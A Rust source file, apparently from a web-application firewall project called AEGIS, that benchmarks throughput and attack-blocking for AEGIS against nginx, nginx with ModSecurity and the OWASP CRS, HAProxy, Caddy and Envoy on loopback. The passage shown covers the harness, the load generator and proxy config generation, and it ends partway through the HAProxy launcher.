//! V245 — multi-target reverse-proxy comparison.
//!
//! The flood/capacity benchmarks measure AEGIS in isolation. Operators kept
//! asking the obvious next question: *how does this compare to the other
//! proxies on the same box?* This module answers it in two honest dimensions,
//! measured live on the host the panel runs on, against a uniform set of
//! competitors.
//!
//! ## The reverse-proxy model
//! Every competitor (nginx, nginx+ModSec+CRS, HAProxy, Caddy, Envoy) is spun up
//! ephemerally as a REVERSE PROXY in front of one shared in-process upstream `U`
//! (a tiny tokio server returning `200 ok`). This lets us measure BOTH:
//!
//! 1. **Throughput** — the same bounded keep-alive load generator (`measure`)
//!    is driven against each proxy's loopback listener. Reports req/s + p50/p99.
//!
//! 2. **Security coverage** — each representative attack payload is sent THROUGH
//!    the proxy to `U`. If the proxy returns 4xx it BLOCKED the attack; if it
//!    reaches `U` and returns 200 it PASSED it. Plain proxies (nginx, HAProxy,
//!    Caddy, Envoy) forward everything → blocked:false; nginx+ModSec+CRS returns
//!    403 on most → blocked:true.
//!
//! The AEGIS lanes are ALSO reverse proxies to the same upstream `U` (apples-to-
//! apples — they pay the identical proxy→upstream hop the others pay):
//!   * **AEGIS (raw)** — AEGIS's async proxy stack, no inspection. Security
//!     verdicts: always passes (no WAF).
//!   * **AEGIS + WAF** — the same proxy stack running AEGIS's REAL
//!     FilterEngine/WafFilter per request before forwarding. Security verdicts
//!     come from the in-process WAF matcher (`WafFilter::signature_category`).
//!   (These use AEGIS's in-process engine, not the full aegis-pingora binary, so
//!    they reflect the proxy-stack + inspection cost on the identical task.)
//!
//! ## Honesty / caveats
//! * Loopback, single host, bounded duration — like the rest of the bench page.
//! * Every ephemeral proxy binds `127.0.0.1:<free port>`, reverse-proxies to the
//!   shared in-process upstream, and runs UNPRIVILEGED (all pid/log/temp paths
//!   under a per-run temp dir). Each is auto-torn-down on drop. If a binary is
//!   absent the target reports `available:false` and the matrix still renders.
//!
//! ## Stand provisioning (Debian 12 amd64)
//! The competitors come from apt + one downloaded Envoy binary:
//! ```text
//! apt install haproxy caddy libnginx-mod-http-modsecurity modsecurity-crs libmodsecurity3
//! # Envoy (no apt pkg): download the pinned static binary to /usr/local/bin/envoy
//! # Then DISABLE the services so they never hold :80/:443 — AEGIS owns those:
//! systemctl disable --now nginx haproxy caddy
//! systemctl mask caddy caddy-api          # caddy-api can independently bind ports
//! ```
//! The benchmark spawns its OWN ephemeral instances on loopback high ports.

use std::net::SocketAddr;
use std::sync::Arc;
use std::sync::atomic::{AtomicBool, AtomicU64, Ordering};
use std::time::{Duration, Instant, SystemTime, UNIX_EPOCH};

use serde::Serialize;
use tokio::io::{AsyncReadExt, AsyncWriteExt};
use tokio::net::{TcpListener, TcpStream};

/// Per-target measurement window. Short — this runs on a live host.
const MEASURE_DURATION: Duration = Duration::from_millis(1500);
const MEASURE_CONCURRENCY: usize = 64;
/// Overall safety budget for the whole comparison run. Seven targets each
/// measured + probed (sequentially, since each binds a port) easily exceeds the
/// old 20s ceiling, so the budget is generous.
const TOTAL_BUDGET: Duration = Duration::from_secs(90);

// ---------------------------------------------------------------------------
// Result shapes (serialised to the admin API / panel).
// ---------------------------------------------------------------------------

/// One target column: throughput + availability + WAF flag. Both the throughput
/// loop and the security loop iterate the same registry so order + naming stay
/// in sync (display order is left→right as listed in [`TARGETS`]).
#[derive(Serialize, Clone)]
pub struct TargetResult {
    /// Display name, e.g. "AEGIS (raw)", "nginx+ModSec+CRS".
    pub name: String,
    /// "aegis" | "proxy".
    pub kind: String,
    /// false when the binary is absent on the host.
    pub available: bool,
    pub version: Option<String>,
    /// 0.0 when unavailable.
    pub throughput_rps: f64,
    pub p50_ms: f64,
    pub p99_ms: f64,
    /// true for "AEGIS + WAF" and "nginx+ModSec+CRS".
    pub has_waf: bool,
}

/// One target's verdict on one attack sample.
#[derive(Serialize, Clone)]
pub struct SecVerdict {
    pub target: String,
    pub blocked: bool,
    /// false when the target is unavailable (binary absent).
    pub applicable: bool,
}

/// One attack row across all targets.
#[derive(Serialize, Clone)]
pub struct SecurityRow {
    pub attack: String,
    pub sample: String,
    pub category: String,
    /// One verdict per target, in display order.
    pub verdicts: Vec<SecVerdict>,
}

#[derive(Serialize, Clone)]
pub struct ComparisonResult {
    pub ok: bool,
    pub status: String,
    pub error: Option<String>,
    pub started_at_unix: Option<u64>,
    pub duration_ms: Option<u64>,
    /// One entry per target, in fixed display order.
    pub targets: Vec<TargetResult>,
    pub security: Vec<SecurityRow>,
    pub caveat: String,
}

const CAVEAT: &str = "LOOPBACK COMPARISON — throughput is measured over \
    127.0.0.1 with bounded duration. ALL targets — AEGIS included — are reverse \
    proxies in front of ONE shared in-process upstream returning `200 ok`: each \
    forwards the request to the upstream and relays the response, so every target \
    pays the same proxy→upstream hop (apples-to-apples). The load generator hits \
    each target's loopback listener, and each attack payload is sent THROUGH it \
    (4xx = blocked, 200 reaching the upstream = passed). \"AEGIS (raw)\" is the \
    async proxy stack with no inspection; \"AEGIS + WAF\" runs AEGIS's REAL \
    pipeline (full FilterEngine when wired, else the built-in WAF) per request — \
    the honest price of protection. The AEGIS lanes use the in-process engine, \
    NOT the full aegis-pingora binary (no TLS/HTTP2 machinery). Only \
    nginx+ModSec+CRS and AEGIS+WAF carry a WAF; the bare proxies forward every \
    attack to the origin. A missing binary renders as unavailable.";

// ---------------------------------------------------------------------------
// Target registry — single source of truth for display order + metadata.
// ---------------------------------------------------------------------------

/// Which target this row describes. Drives both the throughput loop and the
/// security loop so order + naming never drift.
#[derive(Clone, Copy, PartialEq, Eq)]
enum TargetKind {
    AegisRaw,
    AegisWaf,
    Nginx,
    NginxModSec,
    HaProxy,
    Caddy,
    Envoy,
}

struct TargetSpec {
    kind: TargetKind,
    name: &'static str,
    /// "aegis" | "proxy".
    kind_str: &'static str,
    has_waf: bool,
}

/// Display order (left→right). Both loops iterate this.
const TARGETS: &[TargetSpec] = &[
    TargetSpec {
        kind: TargetKind::AegisRaw,
        name: "AEGIS (raw)",
        kind_str: "aegis",
        has_waf: false,
    },
    TargetSpec {
        kind: TargetKind::AegisWaf,
        name: "AEGIS + WAF",
        kind_str: "aegis",
        has_waf: true,
    },
    TargetSpec {
        kind: TargetKind::Nginx,
        name: "nginx",
        kind_str: "proxy",
        has_waf: false,
    },
    TargetSpec {
        kind: TargetKind::NginxModSec,
        name: "nginx+ModSec+CRS",
        kind_str: "proxy",
        has_waf: true,
    },
    TargetSpec {
        kind: TargetKind::HaProxy,
        name: "HAProxy",
        kind_str: "proxy",
        has_waf: false,
    },
    TargetSpec {
        kind: TargetKind::Caddy,
        name: "Caddy",
        kind_str: "proxy",
        has_waf: false,
    },
    TargetSpec {
        kind: TargetKind::Envoy,
        name: "Envoy",
        kind_str: "proxy",
        has_waf: false,
    },
];

impl ComparisonResult {
    pub fn idle() -> Self {
        Self {
            ok: true,
            status: "idle".into(),
            error: None,
            started_at_unix: None,
            duration_ms: None,
            targets: Vec::new(),
            security: Vec::new(),
            caveat: CAVEAT.into(),
        }
    }
    pub fn running(started_at_unix: u64) -> Self {
        Self {
            status: "running".into(),
            started_at_unix: Some(started_at_unix),
            ..Self::idle()
        }
    }
    pub fn error(msg: String) -> Self {
        Self {
            ok: false,
            status: "error".into(),
            error: Some(msg),
            ..Self::idle()
        }
    }
}

/// Single-run guard + last result, mirroring FloodState.
pub struct CompareState {
    pub running: AtomicBool,
    pub started_at_unix: AtomicU64,
    pub result: arc_swap::ArcSwap<Option<ComparisonResult>>,
}

impl Default for CompareState {
    fn default() -> Self {
        Self::new()
    }
}

impl CompareState {
    pub fn new() -> Self {
        Self {
            running: AtomicBool::new(false),
            started_at_unix: AtomicU64::new(0),
            result: arc_swap::ArcSwap::from_pointee(None),
        }
    }
}

pub fn try_start(state: &Arc<CompareState>) -> Result<u64, ()> {
    state
        .running
        .compare_exchange(false, true, Ordering::AcqRel, Ordering::Acquire)
        .map_err(|_| ())?;
    let ts = SystemTime::now()
        .duration_since(UNIX_EPOCH)
        .map(|d| d.as_secs())
        .unwrap_or(0);
    state.started_at_unix.store(ts, Ordering::Release);
    Ok(ts)
}

// ---------------------------------------------------------------------------
// Tiny latency histogram (linear 50µs buckets) — bounded memory.
// ---------------------------------------------------------------------------

/// Linear 50µs buckets up to 25ms (500 buckets) + one overflow bucket. This
/// gives 0.05ms resolution in the sub-millisecond range these loopback requests
/// live in — a power-of-2 histogram collapsed everything to "1ms vs 2ms" noise.
const LAT_BUCKETS: usize = 501;
const LAT_BUCKET_US: u64 = 50;

struct LatHist {
    buckets: Vec<AtomicU64>,
    count: AtomicU64,
}

impl LatHist {
    fn new() -> Self {
        Self {
            buckets: (0..LAT_BUCKETS).map(|_| AtomicU64::new(0)).collect(),
            count: AtomicU64::new(0),
        }
    }
    fn record(&self, d: Duration) {
        let us = d.as_micros() as u64;
        let idx = ((us / LAT_BUCKET_US) as usize).min(LAT_BUCKETS - 1);
        self.buckets[idx].fetch_add(1, Ordering::Relaxed);
        self.count.fetch_add(1, Ordering::Relaxed);
    }
    fn percentile_ms(&self, p: f64) -> f64 {
        let total = self.count.load(Ordering::Relaxed);
        if total == 0 {
            return 0.0;
        }
        let target = (total as f64 * p).ceil() as u64;
        let mut acc = 0u64;
        for (i, b) in self.buckets.iter().enumerate() {
            acc += b.load(Ordering::Relaxed);
            if acc >= target {
                // Bucket i covers [i*50µs, (i+1)*50µs); report the upper edge.
                let upper_us = ((i as u64) + 1) * LAT_BUCKET_US;
                return upper_us as f64 / 1000.0;
            }
        }
        0.0
    }
}

// ---------------------------------------------------------------------------
// Load generator — shared by every target for a fair comparison.
// ---------------------------------------------------------------------------

/// Returns (achieved_rps, p50_ms, p99_ms, errors).
async fn measure(addr: SocketAddr) -> (u64, f64, f64, u64) {
    let hist = Arc::new(LatHist::new());
    let completed = Arc::new(AtomicU64::new(0));
    let failed = Arc::new(AtomicU64::new(0));
    let deadline = Instant::now() + MEASURE_DURATION;
    let req: &'static [u8] =
        b"GET / HTTP/1.1\r\nHost: bench.local\r\nConnection: keep-alive\r\n\r\n";

    let mut workers = Vec::new();
    for _ in 0..MEASURE_CONCURRENCY {
        let hist = Arc::clone(&hist);
        let completed = Arc::clone(&completed);
        let failed = Arc::clone(&failed);
        workers.push(tokio::spawn(async move {
            let mut stream = match TcpStream::connect(addr).await {
                Ok(s) => {
                    let _ = s.set_nodelay(true);
                    s
                }
                Err(_) => {
                    failed.fetch_add(1, Ordering::Relaxed);
                    return;
                }
            };
            let mut buf = [0u8; 4096];
            while Instant::now() < deadline {
                let t0 = Instant::now();
                if stream.write_all(req).await.is_err() {
                    failed.fetch_add(1, Ordering::Relaxed);
                    break;
                }
                match tokio::time::timeout(Duration::from_millis(250), stream.read(&mut buf)).await
                {
                    Ok(Ok(n)) if n > 0 => {
                        hist.record(t0.elapsed());
                        completed.fetch_add(1, Ordering::Relaxed);
                    }
                    _ => {
                        failed.fetch_add(1, Ordering::Relaxed);
                        break;
                    }
                }
            }
        }));
    }
    for w in workers {
        let _ = w.await;
    }

    let done = completed.load(Ordering::Relaxed);
    let rps = (done as f64 / MEASURE_DURATION.as_secs_f64()).round() as u64;
    (
        rps,
        hist.percentile_ms(0.50),
        hist.percentile_ms(0.99),
        failed.load(Ordering::Relaxed),
    )
}

// ---------------------------------------------------------------------------
// Shared in-process upstream U + AEGIS in-process servers.
// ---------------------------------------------------------------------------

/// Minimal in-process keep-alive HTTP/1.1 server returning `200 ok`. Serves two
/// roles: (a) the bare "AEGIS (raw)" serving stack measured directly, and (b)
/// the shared upstream `U` that every ephemeral proxy reverse-proxies to.
/// Returns its bound addr + a JoinHandle to abort.
async fn spawn_inprocess_server() -> std::io::Result<(SocketAddr, tokio::task::JoinHandle<()>)> {
    let listener = TcpListener::bind("127.0.0.1:0").await?;
    let addr = listener.local_addr()?;
    let handle = tokio::spawn(async move {
        loop {
            let (mut stream, _) = match listener.accept().await {
                Ok(p) => p,
                Err(_) => break,
            };
            tokio::spawn(async move {
                let mut buf = [0u8; 2048];
                loop {
                    match stream.read(&mut buf).await {
                        Ok(0) => break,
                        Ok(_) => {
                            let resp =
                                b"HTTP/1.1 200 OK\r\nContent-Length: 2\r\nConnection: keep-alive\r\n\r\nok";
                            if stream.write_all(resp).await.is_err() {
                                break;
                            }
                        }
                        Err(_) => break,
                    }
                }
            });
        }
    });
    Ok((addr, handle))
}

/// Build a representative `RequestContext` for the protected-throughput
/// measurement. This is a benign, realistic GET that the pipeline will
/// ALLOW — we are measuring the *inspection cost* on the happy path, not
/// the (much cheaper) early-out that a hostile request would hit. The
/// fields here mirror what the pingora `build_ctx` populates on a plain
/// HTTP/1.1 request: client IP, host, path, a user-agent header, and the
/// HTTP version. The expensive cold fingerprints (ja3/ja4/…) are left
/// `None`, exactly as they are for a non-TLS request.
fn synthetic_ctx() -> crate::proxy::request_context::RequestContext {
    use crate::proxy::request_context::{RequestContext, next_request_id_u64};
    use hyper::Method;
    use hyper::http::{HeaderMap, Version};

    let mut headers = HeaderMap::new();
    headers.insert("host", "bench.local".parse().expect("host"));
    headers.insert(
        "user-agent",
        "Mozilla/5.0 (compatible; AegisBench/1.0)"
            .parse()
            .expect("ua"),
    );
    headers.insert("accept", "*/*".parse().expect("accept"));

    RequestContext {
        client_ip: std::net::IpAddr::from([127, 0, 0, 1]),
        is_trusted: false,
        method: Method::GET,
        host: "bench.local".to_string(),
        path: "/index.html?ref=home".to_string(),
        headers: Arc::new(headers),
        timestamp: Instant::now(),
        request_id: next_request_id_u64(),
        user_agent: Some("Mozilla/5.0 (compatible; AegisBench/1.0)".to_string()),
        ja3: None,
        ja4: None,
        http_version: Version::HTTP_11,
        ja4h_cache: std::sync::OnceLock::new(),
        ja4t: None,
        ja4l: None,
        h2fp: None,
        h3fp: None,
        mtls_fp: None,
    }
}

/// What the protected server runs per request, in priority order:
///   * full `FilterEngine::evaluate` when the proxy's engine was wired in
///     (approach A — the most faithful: the entire filter chain, incl. WAF,
///     bot, rate-limit, smuggling, honeypot, scorer, runs exactly as on the
///     live data plane);
///   * else a standalone `WafFilter` scan of the request (approach B —
///     the dominant inspection cost) so the bar is still honest when the
///     engine handle is unavailable.
enum Inspector {
    Engine(Arc<crate::filters::engine::FilterEngine>),
    Waf(Arc<crate::filters::waf::WafFilter>),
}

impl Inspector {
    /// Run the real inspection over a freshly-built representative request.
    /// Returns nothing — we discard the verdict; the point is to burn the
    /// same CPU the live path would for a benign allow.
    #[inline]
    fn inspect(&self) {
        let ctx = synthetic_ctx();
        match self {
            Inspector::Engine(e) => {
                let _ = e.evaluate(&ctx);
            }
            Inspector::Waf(w) => {
                use crate::filters::TrafficFilter;
                let _ = w.check(&ctx);
            }
        }
    }
    fn label(&self) -> &'static str {
        match self {
            Inspector::Engine(_) => "full FilterEngine",
            Inspector::Waf(_) => "WafFilter",
        }
    }
}

/// In-process REVERSE PROXY for the AEGIS lanes — apples-to-apples with every
/// other target. It forwards each request to the SAME shared upstream `U`
/// (one keep-alive upstream connection per client connection, mirroring how
/// nginx/HAProxy pool keepalive to the backend) and relays the response back,
/// so it pays the identical proxy→upstream hop the external proxies pay. The
/// ONLY difference between the "AEGIS (raw)" lane (`inspector = None`) and the
/// "AEGIS + WAF" lane (`inspector = Some(...)`) is the per-request
/// `inspector.inspect()` — AEGIS's real filter pipeline / WAF — run BEFORE the
/// request is forwarded, exactly where the live data plane decides allow/deny.
///
/// HONESTY NOTE: this measures AEGIS's async serving + filter cost performing
/// the SAME reverse-proxy task as the field; it is NOT the full aegis-pingora
/// binary (no TLS/HTTP2 machinery), so read it as the proxy-stack + inspection
/// cost, measured fairly — earlier this lane TERMINATED locally (returned 200
/// without forwarding), which skipped the upstream hop and overstated AEGIS.
async fn spawn_aegis_proxy(
    upstream: SocketAddr,
    inspector: Option<Arc<Inspector>>,
) -> std::io::Result<(SocketAddr, tokio::task::JoinHandle<()>)> {
    let listener = TcpListener::bind("127.0.0.1:0").await?;
    let addr = listener.local_addr()?;
    let handle = tokio::spawn(async move {
        loop {
            let (mut client, _) = match listener.accept().await {
                Ok(p) => p,
                Err(_) => break,
            };
            let inspector = inspector.clone();
            tokio::spawn(async move {
                let _ = client.set_nodelay(true);
                // One keep-alive upstream connection per client connection.
                let mut up = match TcpStream::connect(upstream).await {
                    Ok(s) => {
                        let _ = s.set_nodelay(true);
                        s
                    }
                    Err(_) => return,
                };
                let mut cbuf = [0u8; 2048];
                let mut ubuf = [0u8; 4096];
                loop {
                    let n = match client.read(&mut cbuf).await {
                        Ok(0) => break,
                        Ok(n) => n,
                        Err(_) => break,
                    };
                    // Real inspection (the protection cost) before forwarding.
                    if let Some(insp) = &inspector {
                        insp.inspect();
                    }
                    // Forward the client's request to U and relay U's response.
                    if up.write_all(&cbuf[..n]).await.is_err() {
                        break;
                    }
                    match tokio::time::timeout(Duration::from_millis(500), up.read(&mut ubuf)).await
                    {
                        Ok(Ok(m)) if m > 0 => {
                            if client.write_all(&ubuf[..m]).await.is_err() {
                                break;
                            }
                        }
                        _ => break,
                    }
                }
            });
        }
    });
    Ok((addr, handle))
}

// ---------------------------------------------------------------------------
// Generic ephemeral-proxy harness.
// ---------------------------------------------------------------------------

/// Guard that kills the child + removes the per-run temp dir on drop. Shared by
/// every binary proxy (nginx / haproxy / caddy / envoy). Same teardown contract
/// as the old `NginxRun`.
struct ProxyRun {
    child: std::process::Child,
    dir: std::path::PathBuf,
}
impl Drop for ProxyRun {
    fn drop(&mut self) {
        let _ = self.child.kill();
        let _ = self.child.wait();
        let _ = std::fs::remove_dir_all(&self.dir);
    }
}

/// A successfully-launched ephemeral proxy: the Drop guard, its loopback
/// listener addr, and an optional version string.
struct LaunchedProxy {
    run: ProxyRun,
    addr: SocketAddr,
    version: Option<String>,
}

/// Find a binary by checking explicit paths, then `command -v`.
fn find_binary(paths: &[&str], name: &str) -> Option<String> {
    for p in paths {
        if std::path::Path::new(p).exists() {
            return Some((*p).to_string());
        }
    }
    if let Ok(out) = std::process::Command::new("sh")
        .args(["-c", &format!("command -v {name}")])
        .output()
    {
        if out.status.success() {
            let p = String::from_utf8_lossy(&out.stdout).trim().to_string();
            if !p.is_empty() {
                return Some(p);
            }
        }
    }
    None
}

/// Reserve a free loopback port by binding then dropping the listener.
async fn free_loopback_port() -> Option<u16> {
    let l = TcpListener::bind("127.0.0.1:0").await.ok()?;
    Some(l.local_addr().ok()?.port())
}

/// Per-run temp dir, unique via pid + port (no rand dependency).
fn run_dir(prefix: &str, port: u16) -> std::path::PathBuf {
    std::env::temp_dir().join(format!(
        "aegis-{prefix}-bench-{}-{}",
        std::process::id(),
        port
    ))
}

/// Poll `connect()` until the proxy binds, or give up. `tries` × 50ms.
async fn wait_for_bind(addr: SocketAddr, tries: usize) -> bool {
    for _ in 0..tries {
        if TcpStream::connect(addr).await.is_ok() {
            return true;
        }
        tokio::time::sleep(Duration::from_millis(50)).await;
    }
    false
}

// --- nginx (plain reverse proxy) -------------------------------------------

fn nginx_binary() -> Option<String> {
    find_binary(
        &["/usr/sbin/nginx", "/usr/bin/nginx", "/usr/local/sbin/nginx"],
        "nginx",
    )
}

fn nginx_version(bin: &str) -> Option<String> {
    let out = std::process::Command::new(bin).arg("-v").output().ok()?;
    // nginx prints the version to stderr (quirk; everything else uses stdout).
    let s = String::from_utf8_lossy(&out.stderr);
    s.lines()
        .next()
        .map(|l| l.replace("nginx version:", "").trim().to_string())
        .filter(|s| !s.is_empty())
}

/// Create the standard nginx temp subdirs under `dir`.
fn nginx_temp_subdirs(dir: &std::path::Path) {
    for sub in ["client", "proxy", "fastcgi", "uwsgi", "scgi"] {
        let _ = std::fs::create_dir_all(dir.join(sub));
    }
}

async fn launch_nginx(upstream: SocketAddr) -> Option<LaunchedProxy> {
    let bin = nginx_binary()?;
    let port = free_loopback_port().await?;
    let dir = run_dir("nginx", port);
    std::fs::create_dir_all(&dir).ok()?;
    nginx_temp_subdirs(&dir);

    let conf = dir.join("nginx.conf");
    let conf_body = format!(
        // worker_processes auto → nginx uses every core, matching AEGIS's
        // multi-threaded tokio runtime. A single-worker nginx would be an
        // unfairly easy target. `proxy_pass` to the shared upstream U.
        "daemon off;\n\
         worker_processes auto;\n\
         pid {dir}/nginx.pid;\n\
         error_log {dir}/error.log crit;\n\
         events {{ worker_connections 4096; }}\n\
         http {{\n\
         access_log off;\n\
         client_body_temp_path {dir}/client;\n\
         proxy_temp_path {dir}/proxy;\n\
         fastcgi_temp_path {dir}/fastcgi;\n\
         uwsgi_temp_path {dir}/uwsgi;\n\
         scgi_temp_path {dir}/scgi;\n\
         keepalive_timeout 65;\n\
         upstream aegis_upstream {{ server {upstream}; keepalive 64; }}\n\
         server {{\n\
         listen 127.0.0.1:{port};\n\
         location / {{\n\
         proxy_pass http://aegis_upstream;\n\
         proxy_http_version 1.1;\n\
         proxy_set_header Connection \"\";\n\
         }}\n\
         }}\n\
         }}\n",
        dir = dir.display(),
        upstream = upstream,
    );
    std::fs::write(&conf, conf_body).ok()?;

    let child = std::process::Command::new(&bin)
        .arg("-p")
        .arg(&dir)
        .arg("-c")
        .arg(&conf)
        .stdout(std::process::Stdio::null())
        .stderr(std::process::Stdio::null())
        .spawn()
        .ok()?;
    let run = ProxyRun { child, dir };
    let addr: SocketAddr = format!("127.0.0.1:{port}").parse().ok()?;
    if wait_for_bind(addr, 40).await {
        Some(LaunchedProxy {
            run,
            addr,
            version: nginx_version(&bin),
        })
    } else {
        None // run drops → child killed + dir cleaned
    }
}

// --- nginx + ModSecurity v3 + OWASP CRS ------------------------------------

const MODSEC_MODULE: &str = "/usr/lib/nginx/modules/ngx_http_modsecurity_module.so";
// CRS is included via its component files directly. We deliberately DO NOT use
// the Debian `owasp-crs.load`: it uses `IncludeOptional`, an Apache
// mod_security2 directive that libmodsecurity3 (the engine behind the nginx
// connector) does NOT understand — loading it fails with
// "Invalid input: IncludeOptional ...". Including the real files with plain
// `Include` loads all ~914 CRS rules cleanly.
const CRS_SETUP: &str = "/etc/modsecurity/crs/crs-setup.conf";
const CRS_BEFORE: &str = "/etc/modsecurity/crs/REQUEST-900-EXCLUSION-RULES-BEFORE-CRS.conf";
const CRS_RULES_GLOB: &str = "/usr/share/modsecurity-crs/rules/*.conf";
const CRS_AFTER: &str = "/etc/modsecurity/crs/RESPONSE-999-EXCLUSION-RULES-AFTER-CRS.conf";
const UNICODE_MAPPING: &str = "/etc/nginx/unicode.mapping";

/// nginx+ModSec is available only when nginx, the connector module, and the CRS
/// setup file all exist on disk.
fn nginx_modsec_available() -> bool {
    nginx_binary().is_some()
        && std::path::Path::new(MODSEC_MODULE).exists()
        && std::path::Path::new(CRS_SETUP).exists()
}

async fn launch_nginx_modsec(upstream: SocketAddr) -> Option<LaunchedProxy> {
    let bin = nginx_binary()?;
    if !nginx_modsec_available() {
        return None;
    }
    let port = free_loopback_port().await?;
    let dir = run_dir("nginx-modsec", port);
    std::fs::create_dir_all(&dir).ok()?;
    nginx_temp_subdirs(&dir);
    // Copy the unicode map into the run dir → zero /etc reads at runtime and no
    // ModSecurity relative-path footgun.
    let unicode = dir.join("unicode.mapping");
    let _ = std::fs::copy(UNICODE_MAPPING, &unicode);

    let modsec_conf = dir.join("modsec.conf");
    let modsec_body = format!(
        "SecRuleEngine On\n\
         SecRequestBodyAccess On\n\
         SecResponseBodyAccess Off\n\
         SecRequestBodyLimit 13107200\n\
         SecRequestBodyNoFilesLimit 131072\n\
         SecPcreMatchLimit 100000\n\
         SecPcreMatchLimitRecursion 100000\n\
         SecUnicodeMapFile {unicode} 20127\n\
         SecTmpDir {dir}\n\
         SecDataDir {dir}\n\
         SecUploadDir {dir}\n\
         SecAuditEngine Off\n\
         SecAuditLog /dev/null\n\
         SecDebugLog /dev/null\n\
         SecDebugLogLevel 0\n\
         Include {setup}\n\
         Include {before}\n\
         Include {rules}\n\
         Include {after}\n",
        unicode = unicode.display(),
        dir = dir.display(),
        setup = CRS_SETUP,
        before = CRS_BEFORE,
        rules = CRS_RULES_GLOB,
        after = CRS_AFTER,
    );
    std::fs::write(&modsec_conf, modsec_body).ok()?;

    let conf = dir.join("nginx.conf");
    let conf_body = format!(
        "load_module {module};\n\
         daemon off;\n\
         worker_processes auto;\n\
         pid {dir}/nginx.pid;\n\
         error_log {dir}/error.log crit;\n\
         events {{ worker_connections 4096; }}\n\
         http {{\n\
         access_log off;\n\
         client_body_temp_path {dir}/client;\n\
         proxy_temp_path {dir}/proxy;\n\
         fastcgi_temp_path {dir}/fastcgi;\n\
         uwsgi_temp_path {dir}/uwsgi;\n\
         scgi_temp_path {dir}/scgi;\n\
         keepalive_timeout 65;\n\
         upstream aegis_upstream {{ server {upstream}; keepalive 64; }}\n\
         server {{\n\
         listen 127.0.0.1:{port};\n\
         modsecurity on;\n\
         modsecurity_rules_file {modsec};\n\
         location / {{\n\
         proxy_pass http://aegis_upstream;\n\
         proxy_http_version 1.1;\n\
         proxy_set_header Connection \"\";\n\
         proxy_set_header Host $host;\n\
         }}\n\
         }}\n\
         }}\n",
        module = MODSEC_MODULE,
        dir = dir.display(),
        upstream = upstream,
        modsec = modsec_conf.display(),
    );
    std::fs::write(&conf, conf_body).ok()?;

    // Preflight: `nginx -t` surfaces an ABI break (#1037226 undefined symbol) or
    // a path typo immediately, instead of hanging the bind-wait loop.
    let test_ok = std::process::Command::new(&bin)
        .arg("-t")
        .arg("-p")
        .arg(&dir)
        .arg("-c")
        .arg(&conf)
        .stdout(std::process::Stdio::null())
        .stderr(std::process::Stdio::null())
        .status()
        .map(|s| s.success())
        .unwrap_or(false);
    if !test_ok {
        let _ = std::fs::remove_dir_all(&dir);
        return None;
    }

    let child = std::process::Command::new(&bin)
        .arg("-p")
        .arg(&dir)
        .arg("-c")
        .arg(&conf)
        .stdout(std::process::Stdio::null())
        .stderr(std::process::Stdio::null())
        .spawn()
        .ok()?;
    let run = ProxyRun { child, dir };
    let addr: SocketAddr = format!("127.0.0.1:{port}").parse().ok()?;
    // CRS parses ~40 rule files at startup → slower than plain nginx; ~3s.
    if wait_for_bind(addr, 60).await {
        Some(LaunchedProxy {
            run,
            addr,
            version: nginx_modsec_version(&bin),
        })
    } else {
        None
    }
}

fn dpkg_version(pkg: &str) -> Option<String> {
    let out = std::process::Command::new("dpkg-query")
        .args(["-W", "-f=${Version}", pkg])
        .output()
        .ok()?;
    if !out.status.success() {
        return None;
    }
    let v = String::from_utf8_lossy(&out.stdout).trim().to_string();
    if v.is_empty() { None } else { Some(v) }
}

fn nginx_modsec_version(bin: &str) -> Option<String> {
    let nginx_ver = nginx_version(bin).unwrap_or_else(|| "nginx".to_string());
    let connector = dpkg_version("libnginx-mod-http-modsecurity");
    let crs = dpkg_version("modsecurity-crs");
    match (connector, crs) {
        (Some(c), Some(r)) => Some(format!("{nginx_ver} + ModSec connector {c} + CRS {r}")),
        _ => Some(format!("{nginx_ver} + ModSec + CRS")),
    }
}

// --- HAProxy ----------------------------------------------------------------

fn haproxy_binary() -> Option<String> {
    find_binary(&["/usr/sbin/haproxy", "/usr/bin/haproxy"], "haproxy")
}

fn haproxy_version(bin: &str) -> Option<String> {
    let out = std::process::Command::new(bin).arg("-v").output().ok()?;
    // HAProxy prints to stdout (unlike nginx). "HAProxy version X" or the very
    // old "HA-Proxy version X".
    let s = String::from_utf8_lossy(&out.stdout);
    let line = s.lines().next()?;
    let v = line
        .trim()
        .strip_prefix("HAProxy version ")
        .or_else(|| line.trim().strip_prefix("HA-Proxy version "))
        .unwrap_or(line.trim());
    v.split_whitespace()
        .next()
        .map(|t| t.to_string())
        .filter(|s| !s.is_empty())
}

async fn launch_haproxy(upstream: SocketAddr) -> Option<LaunchedProxy> {
    let bin = haproxy_binary()?;
    let port = free_loopback_port().await?;
    let dir = run_dir("haproxy", port);
    std::fs::create_dir_all(&dir).ok()?;

    let conf = dir.join("haproxy.cfg");
    // `no strict-limits` is load-bearing: HAProxy 2.5+ defaults strict-limits ON,
    // and an unprivileged process cannot raise RLIMIT_NOFILE above its soft
    // limit, which would otherwise be a FATAL ALERT abort. `no strict-limits`
    // demotes that to a harmless WARNING so HAProxy starts regardless of ulimit.
    // Fairness: pin nbthread to the core count so HAProxy uses every core, like
    // AEGIS (tokio), nginx (worker_processes auto), Caddy (GOMAXPROCS) and Envoy
    // (--concurrency). HAProxy 2.6 auto-defaults to all CPUs, but we set it
    // explicitly so the comparison can't be doubted.
    let ncpu = std::thread::available_parallelism()
        .map(|n| n.get())
        .unwrap_or(1);
    let conf_body = format!(
        "global\n\
         \x20\x20\x20\x20maxconn 1024\n\
         \x20\x20\x20\x20nbthread {ncpu}\n\
         \x20\x20\x20\x20no strict-limits\n\
         \n\
         defaults\n\
         \x20\x20\x20\x20mode http\n\
         \x20\x20\x20\x20timeout connect 5s\n\
         \x20\x20\x20\x20timeout client  30s\n\
         \x20\x20\x20\x20timeout server  30s\n\
         \x20\x20\x20\x20option http-keep-alive\n\
         \n\
         frontend fe\n\
         \x20\x20\x20\x20bind 127.0.0.1:{port}\n\
         \x20\x20\x20\x20default_backend be\n\
         \n\
         backend be\n\
         \x20\x20\x20\x20server u {upstream}\n",
        port = port,
        upstream = upstream,
    );
    std::fs::write(&conf, conf_body).ok()?;

    // -db: single foreground process (no daemon, no master-worker fork) → clean
    // kill-on-drop. -W would orphan a worker holding the port.
    let child = std::process::Command::new(&bin)
        .arg("-db")
        .arg("-f")
        .arg(&conf)
        .arg("-p")
        .arg(dir.join("haproxy.pid"))
        .stdout(std::process::Stdio::null())
        .stderr(std::process::Stdio::null())
        .spawn()
        .ok()?;
    let run = ProxyRun { child, dir };
    let addr: SocketAddr = format!("127.0.0.1:{port}").parse().ok()?;
    if wait_for_bind(addr, 40).await {
        Some(LaunchedProxy {
            run,
            addr,
            version: haproxy_version(&bin),
